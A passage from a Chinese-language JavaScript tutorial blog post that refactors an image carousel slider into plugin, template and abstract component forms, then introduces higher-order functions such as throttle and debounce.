class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> idx = evt.detail.index</span><br><span class="line">      <span class="keyword">const</span> selected = controller.querySelector(<span class="string">&#x27;.slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span>(selected) selected.className = <span class="string">&#x27;slide-list__control-buttons&#x27;</span>;</span><br><span class="line">      buttons[idx].className = <span class="string">&#x27;slide-list__control-buttons--selected&#x27;</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 左按钮</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pluginPrevious</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> previous = slider.container.querySelector(<span class="string">&#x27;.slide-list__previous&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(previous)&#123;</span><br><span class="line">    previous.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">      slider.stop();</span><br><span class="line">      slider.slidePrevious();</span><br><span class="line">      slider.start();</span><br><span class="line">      evt.preventDefault();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 右按钮</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pluginNext</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> next = slider.container.querySelector(<span class="string">&#x27;.slide-list__next&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(next)&#123;</span><br><span class="line">    next.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">      slider.stop();</span><br><span class="line">      slider.slideNext();</span><br><span class="line">      slider.start();</span><br><span class="line">      evt.preventDefault();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> slider = <span class="keyword">new</span> Slider(<span class="string">&#x27;my-slider&#x27;</span>);</span><br><span class="line">slider.registerPlugins(pluginController, pluginPrevious, pluginNext);</span><br><span class="line">slider.start();</span><br></pre></td></tr></table></figure><h3 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h3><p>将 HTML 模板化，更易于拓展。<a href="https://code.h5jun.com/zuve/3/edit?js,output">https://code.h5jun.com/zuve/3/edit?js,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slider</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">id, opts = &#123;images:[], cycle: <span class="number">3000</span>&#125;</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container = <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">    <span class="built_in">this</span>.options = opts;</span><br><span class="line">    <span class="built_in">this</span>.container.innerHTML = <span class="built_in">this</span>.render();</span><br><span class="line">    <span class="built_in">this</span>.items = <span class="built_in">this</span>.container.querySelectorAll(<span class="string">&#x27;.slider-list__item, .slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="built_in">this</span>.cycle = opts.cycle || <span class="number">3000</span>;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> images = <span class="built_in">this</span>.options.images;</span><br><span class="line">    <span class="keyword">const</span> content = images.map(<span class="function"><span class="params">image</span> =&gt;</span> <span class="string">`</span></span><br><span class="line"><span class="string">      &lt;li class=&quot;slider-list__item&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;<span class="subst">$&#123;image&#125;</span>&quot;/&gt;</span></span><br><span class="line"><span class="string">      &lt;/li&gt;    </span></span><br><span class="line"><span class="string">    `</span>.trim());</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;ul&gt;<span class="subst">$&#123;content.join(<span class="string">&#x27;&#x27;</span>)&#125;</span>&lt;/ul&gt;`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">registerPlugins</span>(<span class="params">...plugins</span>)</span>&#123;</span><br><span class="line">    plugins.forEach(<span class="function"><span class="params">plugin</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> pluginContainer = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">      pluginContainer.className = <span class="string">&#x27;.slider-list__plugin&#x27;</span>;</span><br><span class="line">      pluginContainer.innerHTML = plugin.render(<span class="built_in">this</span>.options.images);</span><br><span class="line">      <span class="built_in">this</span>.container.appendChild(pluginContainer);</span><br><span class="line">      </span><br><span class="line">      plugin.action(<span class="built_in">this</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItem</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> selected</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItemIndex</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="built_in">this</span>.items).indexOf(<span class="built_in">this</span>.getSelectedItem());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideTo</span>(<span class="params">idx</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.getSelectedItem();</span><br><span class="line">    <span class="keyword">if</span>(selected)&#123; </span><br><span class="line">      selected.className = <span class="string">&#x27;slider-list__item&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> item = <span class="built_in">this</span>.items[idx];</span><br><span class="line">    <span class="keyword">if</span>(item)&#123;</span><br><span class="line">      item.className = <span class="string">&#x27;slider-list__item--selected&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> detail = &#123;<span class="attr">index</span>: idx&#125;</span><br><span class="line">    <span class="keyword">const</span> event = <span class="keyword">new</span> CustomEvent(<span class="string">&#x27;slide&#x27;</span>, &#123;<span class="attr">bubbles</span>:<span class="literal">true</span>, detail&#125;)</span><br><span class="line">    <span class="built_in">this</span>.container.dispatchEvent(event)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> nextIdx = (currentIdx + <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(nextIdx);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slidePrevious</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> previousIdx = (<span class="built_in">this</span>.items.length + currentIdx - <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(previousIdx);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">addEventListener</span>(<span class="params">type, handler</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container.addEventListener(type, handler);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.stop();</span><br><span class="line">    <span class="built_in">this</span>._timer = <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span><span class="built_in">this</span>.slideNext(), <span class="built_in">this</span>.cycle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">stop</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(<span class="built_in">this</span>._timer);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pluginController = &#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params">images</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;slide-list__control&quot;&gt;</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;images.map((image, i) =&gt; <span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">            &lt;span class=&quot;slide-list__control-buttons<span class="subst">$&#123;i===<span class="number">0</span>?<span class="string">&#x27;--selected&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span>&quot;&gt;&lt;/span&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">         `</span>).join(<span class="string">&#x27;&#x27;</span>)&#125;</span></span></span><br><span class="line"><span class="string">      &lt;/div&gt;    </span></span><br><span class="line"><span class="string">    `</span>.trim();</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">action</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> controller = slider.container.querySelector(<span class="string">&#x27;.slide-list__control&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(controller)&#123;</span><br><span class="line">      <span class="keyword">const</span> buttons = controller.querySelectorAll(<span class="string">&#x27;.slide-list__control-buttons, .slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">      controller.addEventListener(<span class="string">&#x27;mouseover&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> idx = <span class="built_in">Array</span>.from(buttons).indexOf(evt.target);</span><br><span class="line">        <span class="keyword">if</span>(idx &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">          slider.slideTo(idx);</span><br><span class="line">          slider.stop();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      controller.addEventListener(<span class="string">&#x27;mouseout&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        slider.start();</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      slider.addEventListener(<span class="string">&#x27;slide&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> idx = evt.detail.index</span><br><span class="line">        <span class="keyword">const</span> selected = controller.querySelector(<span class="string">&#x27;.slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(selected) selected.className = <span class="string">&#x27;slide-list__control-buttons&#x27;</span>;</span><br><span class="line">        buttons[idx].className = <span class="string">&#x27;slide-list__control-buttons--selected&#x27;</span>;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pluginPrevious = &#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;a class=&quot;slide-list__previous&quot;&gt;&lt;/a&gt;`</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">action</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> previous = slider.container.querySelector(<span class="string">&#x27;.slide-list__previous&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(previous)&#123;</span><br><span class="line">      previous.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        slider.stop();</span><br><span class="line">        slider.slidePrevious();</span><br><span class="line">        slider.start();</span><br><span class="line">        evt.preventDefault();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pluginNext = &#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;a class=&quot;slide-list__next&quot;&gt;&lt;/a&gt;`</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">action</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> previous = slider.container.querySelector(<span class="string">&#x27;.slide-list__next&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(previous)&#123;</span><br><span class="line">      previous.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        slider.stop();</span><br><span class="line">        slider.slideNext();</span><br><span class="line">        slider.start();</span><br><span class="line">        evt.preventDefault();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> slider = <span class="keyword">new</span> Slider(<span class="string">&#x27;my-slider&#x27;</span>, &#123;<span class="attr">images</span>: [<span class="string">&#x27;https://p5.ssl.qhimg.com/t0119c74624763dd070.png&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;https://p4.ssl.qhimg.com/t01adbe3351db853eb3.jpg&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;https://p2.ssl.qhimg.com/t01645cd5ba0c3b60cb.jpg&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;https://p4.ssl.qhimg.com/t01331ac159b58f5478.jpg&#x27;</span>], <span class="attr">cycle</span>:<span class="number">3000</span>&#125;);</span><br><span class="line"></span><br><span class="line">slider.registerPlugins(pluginController, pluginPrevious, pluginNext);</span><br><span class="line">slider.start();</span><br></pre></td></tr></table></figure><h3 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h3><p>将通用的组件模型<strong>抽象</strong>出来。<a href="https://code.h5jun.com/vata/4/edit?js,output">https://code.h5jun.com/vata/4/edit?js,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">id, opts = &#123;name, data:[]&#125;</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container = <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">    <span class="built_in">this</span>.options = opts;</span><br><span class="line">    <span class="built_in">this</span>.container.innerHTML = <span class="built_in">this</span>.render(opts.data);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">registerPlugins</span>(<span class="params">...plugins</span>)</span>&#123;</span><br><span class="line">    plugins.forEach(<span class="function"><span class="params">plugin</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> pluginContainer = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">      pluginContainer.className = <span class="string">`.<span class="subst">$&#123;name&#125;</span>__plugin`</span>;</span><br><span class="line">      pluginContainer.innerHTML = plugin.render(<span class="built_in">this</span>.options.data);</span><br><span class="line">      <span class="built_in">this</span>.container.appendChild(pluginContainer);</span><br><span class="line">      </span><br><span class="line">      plugin.action(<span class="built_in">this</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params">data</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/* abstract */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slider</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">id, opts = &#123;name: <span class="string">&#x27;slider-list&#x27;</span>, data:[], cycle: <span class="number">3000</span>&#125;</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">super</span>(id, opts);</span><br><span class="line">    <span class="built_in">this</span>.items = <span class="built_in">this</span>.container.querySelectorAll(<span class="string">&#x27;.slider-list__item, .slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="built_in">this</span>.cycle = opts.cycle || <span class="number">3000</span>;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> content = data.map(<span class="function"><span class="params">image</span> =&gt;</span> <span class="string">`</span></span><br><span class="line"><span class="string">      &lt;li class=&quot;slider-list__item&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;<span class="subst">$&#123;image&#125;</span>&quot;/&gt;</span></span><br><span class="line"><span class="string">      &lt;/li&gt;    </span></span><br><span class="line"><span class="string">    `</span>.trim());</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;ul&gt;<span class="subst">$&#123;content.join(<span class="string">&#x27;&#x27;</span>)&#125;</span>&lt;/ul&gt;`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItem</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> selected</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItemIndex</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="built_in">this</span>.items).indexOf(<span class="built_in">this</span>.getSelectedItem());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideTo</span>(<span class="params">idx</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.getSelectedItem();</span><br><span class="line">    <span class="keyword">if</span>(selected)&#123; </span><br><span class="line">      selected.className = <span class="string">&#x27;slider-list__item&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> item = <span class="built_in">this</span>.items[idx];</span><br><span class="line">    <span class="keyword">if</span>(item)&#123;</span><br><span class="line">      item.className = <span class="string">&#x27;slider-list__item--selected&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> detail = &#123;<span class="attr">index</span>: idx&#125;</span><br><span class="line">    <span class="keyword">const</span> event = <span class="keyword">new</span> CustomEvent(<span class="string">&#x27;slide&#x27;</span>, &#123;<span class="attr">bubbles</span>:<span class="literal">true</span>, detail&#125;)</span><br><span class="line">    <span class="built_in">this</span>.container.dispatchEvent(event)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> nextIdx = (currentIdx + <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(nextIdx);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slidePrevious</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> previousIdx = (<span class="built_in">this</span>.items.length + currentIdx - <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(previousIdx);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">addEventListener</span>(<span class="params">type, handler</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container.addEventListener(type, handler);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.stop();</span><br><span class="line">    <span class="built_in">this</span>._timer = <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span><span class="built_in">this</span>.slideNext(), <span class="built_in">this</span>.cycle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">stop</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(<span class="built_in">this</span>._timer);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pluginController = &#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params">images</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;slide-list__control&quot;&gt;</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;images.map((image, i) =&gt; <span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">            &lt;span class=&quot;slide-list__control-buttons<span class="subst">$&#123;i===<span class="number">0</span>?<span class="string">&#x27;--selected&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span>&quot;&gt;&lt;/span&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">         `</span>).join(<span class="string">&#x27;&#x27;</span>)&#125;</span></span></span><br><span class="line"><span class="string">      &lt;/div&gt;    </span></span><br><span class="line"><span class="string">    `</span>.trim();</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">action</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> controller = slider.container.querySelector(<span class="string">&#x27;.slide-list__control&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(controller)&#123;</span><br><span class="line">      <span class="keyword">let</span> buttons = controller.querySelectorAll(<span class="string">&#x27;.slide-list__control-buttons, .slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">      controller.addEventListener(<span class="string">&#x27;mouseover&#x27;</span>, <span class="function"><span class="params">evt</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> idx = <span class="built_in">Array</span>.from(buttons).indexOf(evt.target);</span><br><span class="line">        <span class="keyword">if</span>(idx &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">          slider.slideTo(idx);</span><br><span class="line">          slider.stop();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      controller.addEventListener(<span class="string">&#x27;mouseout&#x27;</span>, <span class="function"><span class="params">evt</span>=&gt;</span>&#123;</span><br><span class="line">        slider.start();</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      slider.addEventListener(<span class="string">&#x27;slide&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> idx = evt.detail.index;</span><br><span class="line">        <span class="keyword">let</span> selected = controller.querySelector(<span class="string">&#x27;.slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(selected) selected.className = <span class="string">&#x27;slide-list__control-buttons&#x27;</span>;</span><br><span class="line">        buttons[idx].className = <span class="string">&#x27;slide-list__control-buttons--selected&#x27;</span>;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pluginPrevious = &#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;a class=&quot;slide-list__previous&quot;&gt;&lt;/a&gt;`</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">action</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> previous = slider.container.querySelector(<span class="string">&#x27;.slide-list__previous&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(previous)&#123;</span><br><span class="line">      previous.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        slider.stop();</span><br><span class="line">        slider.slidePrevious();</span><br><span class="line">        slider.start();</span><br><span class="line">        evt.preventDefault();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pluginNext = &#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;a class=&quot;slide-list__next&quot;&gt;&lt;/a&gt;`</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">action</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> previous = slider.container.querySelector(<span class="string">&#x27;.slide-list__next&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(previous)&#123;</span><br><span class="line">      previous.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        slider.stop();</span><br><span class="line">        slider.slideNext();</span><br><span class="line">        slider.start();</span><br><span class="line">        evt.preventDefault();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> slider = <span class="keyword">new</span> Slider(<span class="string">&#x27;my-slider&#x27;</span>, &#123;<span class="attr">name</span>: <span class="string">&#x27;slide-list&#x27;</span>, <span class="attr">data</span>: [<span class="string">&#x27;https://p5.ssl.qhimg.com/t0119c74624763dd070.png&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;https://p4.ssl.qhimg.com/t01adbe3351db853eb3.jpg&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;https://p2.ssl.qhimg.com/t01645cd5ba0c3b60cb.jpg&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;https://p4.ssl.qhimg.com/t01331ac159b58f5478.jpg&#x27;</span>], <span class="attr">cycle</span>:<span class="number">3000</span>&#125;);</span><br><span class="line"></span><br><span class="line">slider.registerPlugins(pluginController, pluginPrevious, pluginNext);</span><br><span class="line">slider.start();</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>组件设计的原则：封装性、正确性、扩展性、复用性</li><li>实现组件的步骤：结构设计、展现效果、行为设计</li><li>三次重构<ul><li>插件化</li><li>模板化</li><li>抽象化（组件框架）</li></ul></li></ul><h2 id="Case：限制操作次数"><a href="#Case：限制操作次数" class="headerlink" title="Case：限制操作次数"></a>Case：限制操作次数</h2><p>想点击button实现淡出效果</p><p><img src="https://i.loli.net/2021/08/17/fPenRm8GZyJa9hD.png" alt="image.png"></p><p>如下代码</p><p><img src="https://i.loli.net/2021/08/17/K3VzBdl8YxgGiIy.png" alt="image.png"></p><p>但是当快速点击多次button时，会报错：<img src="https://i.loli.net/2021/08/17/YMZBWPGhtRgHiuN.png" alt="image.png"></p><p>为了能够让“只执行一次”的需求覆盖不同的事件处理，我们可以将这个需求剥离出来。这个过程称为<strong>过程抽象</strong>：</p><ul><li>用来处理局部细节及控制的一些方法</li><li>函数式编程思想的基础应用</li></ul><p>解决：</p><p><img src="https://i.loli.net/2021/08/17/LVB9xNJqRpI42lM.png" alt="image.png"></p><h2 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h2><ul><li>以函数作为参数</li><li>以函数作为返回值</li><li>常用于作为函数装饰器</li></ul><h3 id="常用的高阶函数："><a href="#常用的高阶函数：" class="headerlink" title="常用的高阶函数："></a>常用的高阶函数：</h3><ul><li><p>Once</p></li><li><p><a href="https://code.h5jun.com/gale/1/edit?js,output">Throttle</a> 节流</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">fn, time = <span class="number">500</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> timer;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(timer == <span class="literal">null</span>)&#123;</span><br><span class="line">      fn.apply(<span class="built_in">this</span>,  args);</span><br><span class="line">      timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        timer = <span class="literal">null</span>;</span><br><span class="line">      &#125;, time)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><a href="https://code.h5jun.com/wik/edit?js,output">Debounce</a> 防抖</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn, dur</span>)</span>&#123;</span><br><span class="line">  dur = dur || <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">var</span> timer;</span><br><span class="line">  <span class="keyword">return</span> <span 